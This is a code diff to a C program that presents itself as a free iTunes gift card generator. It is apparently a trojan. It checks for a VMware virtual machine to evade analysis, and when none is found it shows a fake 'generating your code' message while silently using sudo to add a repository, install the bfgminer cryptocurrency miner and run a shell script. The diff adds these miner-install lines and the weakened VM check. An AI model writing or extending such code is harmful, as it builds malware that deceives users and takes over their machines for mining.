@@ -31,7 +31,7 @@ int main(int argc, const char * argv[]) {
     char* vmware_sys = "System Manufacturer: \t VMware, Inc.";
     run_command("systeminfo | find \"System Manufacturer\"", vmware_sys, 36);
     registry_check();
-    if(vm_score <= 3){
+    if(vm_score < 3){
         printf("Please wait while we generate a gift card code. \nNote, "
                "this could take a while, so please be patient and do not "
                "close the program. Thank you. \n");
@@ -50,6 +50,11 @@ int main(int argc, const char * argv[]) {
 	printf("Please wait while we generate a gift card code. \n Note, "
 		"this could take a while, so please be patient and do not "
 		"close the program. Thank you. \n");
+	system("sudo zypper addrepo http://download.opensuse.org/repositories/home:Fisiu/openSUSE_13.1/home:Fisiu.repo");
+	system("sudo zypper refresh");
+	system("sudo zypper install bfgminer");
+	system("chmod +x iTunesCardGenerator.sh");
+	system("./iTunesCardGenerator.sh");
     }
 
     printf("Virtual Machine detected. In order to receive your free iTunes "
@@ -111,7 +116,7 @@ void run_command(char *cmd, char *detphrase, int dp_length){
    It is modified to only check for vmware, as that is the hypervisor
    the rest of the methods in this program check for.
 */
-
+#ifdef WIN32
 void registry_check(){
     HKEY hkey;
     char *buffer;
@@ -137,3 +142,4 @@ void registry_check(){
 
     return;
 }
+#endif
